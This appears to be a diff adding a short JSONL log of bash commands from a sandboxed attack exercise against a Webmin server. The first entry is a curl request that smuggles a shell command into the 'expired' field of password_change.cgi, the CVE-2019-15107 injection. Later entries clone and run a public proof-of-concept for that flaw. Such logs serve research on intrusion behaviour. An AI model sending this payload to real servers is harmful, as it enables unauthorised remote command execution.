@@ -1,0 +1,7 @@
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:02:57.042968+02:00", "cmd_type": "bash-command", "cmd": "curl http://172.18.1.5:10000/password_change.cgi -d 'user=root&pam=&expired=2|ifconfig&old=foo&new1=bar&new2=bar' -H\"Referer: http://172.18.1.5:10000\""}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:03:31.710238+02:00", "cmd_type": "bash-command", "cmd": "git clone https://github.com/jas502n/CVE-2019-15107"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:03:36.154561+02:00", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:03:40.417025+02:00", "cmd_type": "bash-command", "cmd": "cd CVE-2019-15107/"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:03:42.897148+02:00", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:03:50.861940+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:04:02.037671+02:00", "cmd_type": "bash-command", "cmd": "cat README.md"}
